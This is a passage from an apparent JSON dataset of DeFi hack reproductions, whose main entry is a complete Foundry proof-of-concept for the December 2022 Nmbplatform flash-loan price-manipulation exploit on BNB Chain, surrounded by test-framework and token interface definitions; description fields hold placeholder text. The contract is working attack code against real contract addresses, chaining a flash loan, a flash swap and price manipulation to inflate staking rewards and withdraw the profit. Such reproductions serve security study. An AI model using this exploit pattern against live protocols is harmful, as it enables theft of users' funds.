external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "IUniswapV2Pair",
                        "content": "interface IUniswapV2Pair {\n    function swap(\n      uint256 amount0Out,\n      uint256 amount1Out,\n      address to,\n      bytes calldata data\n    ) external;\n    function skim(address to) external;\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 140,
                        "imported": true
                    },
                    {
                        "name": "IOneRingVault",
                        "content": "interface IOneRingVault {\n  function depositSafe(\n    uint256 _amount,\n    address _token,\n    uint256 _minAmount\n  ) external;\n\n  function withdraw(uint256 _amount, address _underlying) external;\n\n  function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 63,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "f6de2f6a51",
        "is_ready": false,
        "content": "### 20221214 - Nmbplatform - FlashLoan price manipulation\n### Lost: 76k\n#### Contract\n[Nmbplatform_exp.sol](src/test/Nmbplatform_exp.sol)\n#### Link reference\nhttps://twitter.com/BlockSecTeam/status/1602877048124735489",
        "date": "20221214",
        "target": "Nmbplatform",
        "attack_title": "FlashLoan price manipulation",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1602877048124735489",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/Nmbplatform_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1602877048124735489\n// @TX\n// https://bscscan.com/tx/0x7d2d8d2cda2d81529e0e0af90c4bfb39b6e74fa363c60b031d719dd9d153b012\n// https://bscscan.com/tx/0x42f56d3e86fb47e1edffa59222b33b73e7407d4b5bb05e23b83cb1771790f6c1\ninterface NimbusBNB is IERC20{\n    function deposit() payable external;\n    function withdraw(uint256 wad) external;\n}\ninterface StakingRewardFixedAPY is IERC20{\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function withdraw() external;\n    function earned(address account) view external returns(uint);\n} \ninterface LockStakingRewardFixedAPY{\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function earned(address account) view external returns(uint);\n}\ncontract ContractTest is Test{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    IERC20 NIMB = IERC20(0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);\n    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);\n    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);\n    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    uint flashLoanAmount;\n    uint flashSwapAmount;\n    User1 public user1;\n    User2 public user2;\n    User3 public user3;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23639507);\n    }\n    function testExploit() public{\n        user1 = new User1();\n        user2 = new User2();\n        user3 = new User3();\n        NBU_WBNB.deposit{value: 20 ether}();\n        NBU_WBNB.transfer(address(user1), 16 ether);\n        NBU_WBNB.transfer(address(user2), 2 ether);\n        NBU_WBNB.transfer(address(user3), 2 ether);\n        user1.stake();\n        user2.stake();\n        user3.stake();\n        cheats.warp(block.timestamp + 8 * 24 * 60 * 60);\n        flashLoanAmount = WBNB.balanceOf(dodo);\n        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals());\n    }\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        flashSwapAmount = WBNB.balanceOf(address(Pair)) - 1e18;\n        Pair.swap(flashSwapAmount, 0, address(this), new bytes(1));\n        WBNB.transfer(dodo, flashLoanAmount);\n    }\n    function BiswapCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        payable(address(0)).transfer(address(this).balance);\n        WBNB.withdraw(WBNB.balanceOf(address(this)));\n        NBU_WBNB.deposit{value: address(this).balance}();\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(NIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp); // Reward Price Manipulation\n        user1.getReward();\n        // user1.withdraw();\n        GNIMB.transfer(address(stakingReward2), stakingReward2.earned(address(user2)) - GNIMB.balanceOf(address(stakingReward2)));\n        user2.getReward();\n        GNIMB.transfer(address(stakingReward3), stakingReward3.earned(address(user3)) - GNIMB.balanceOf(address(stakingReward3)));\n        user3.getReward();\n        NIMB.approve(address(NimbusRouter), type(uint).max);\n        path[0] = address(NIMB);\n        path[1] = address(NBU_WBNB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(NIMB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n        GNIMBToNBU_WBNB();\n        NBU_WBNB.withdraw(NBU_WBNB.balanceOf(address(this)));\n        address(WBNB).call{value: address(this).balance}(\"\");\n        WBNB.transfer(address(Pair), flashSwapAmount * 1000 / 998 + 1000);\n    }\n    function GNIMBToNBU_WBNB() internal{\n        GNIMB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(GNIMB);\n        path[1] = address(NBU_WBNB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(GNIMB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    receive() payable external{}\n}\ncontract User1 is Test{\n    address Owner;\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);\n    constructor(){\n        Owner = msg.sender;\n    }\n    function stake() external{\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(GNIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n        GNIMB.approve(address(stakingReward1), type(uint).max);\n        stakingReward1.stake(GNIMB.balanceOf(address(this)));\n    }\n    function getReward() external{\n        deal(address(GNIMB), address(stakingReward1), 13_855_114 * 1e18);\n        stakingReward1.getReward();\n        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    }\n    // function withdraw() external{\n    //     stakingReward1.withdraw();\n    //     GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    // }\n}\ncontract User2{\n    address Owner;\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);\n    constructor(){\n        Owner = msg.sender;\n    }\n    function stake() external{\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(GNIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n        GNIMB.approve(address(stakingReward2), type(uint).max);\n        stakingReward2.stake(GNIMB.balanceOf(address(this)));\n    }\n    function getReward() external{\n        stakingReward2.getReward();\n        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    }\n}\ncontract User3{\n    address Owner;\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);\n    constructor(){\n        Owner = msg.sender;\n    }\n    function stake() external{\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(GNIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n        GNIMB.approve(address(stakingReward3), type(uint).max);\n        stakingReward3.stake(GNIMB.balanceOf(address(this)));\n    }\n    function getReward() external{\n        stakingReward3.getReward();\n        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    }\n}",
                "token_count": 2723,
                "interfaces": [
                    {
                        "name": "NimbusBNB",
                        "content": "interface NimbusBNB is IERC20{\n    function deposit() payable external;\n    function withdraw(uint256 wad) external;\n}\n",
                        "token_count": 27,
                        "imported": false
                    },
                    {
                        "name": "StakingRewardFixedAPY",
                        "content": "interface StakingRewardFixedAPY is IERC20{\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function withdraw() external;\n    function earned(address account) view external returns(uint);\n} \n",
                        "token_count": 47,
                        "imported": false
                    },
                    {
                        "name": "LockStakingRewardFixedAPY",
                        "content": "interface LockStakingRewardFixedAPY{\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function earned(address account) view external returns(uint);\n}\n",
                        "token_count": 37,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function 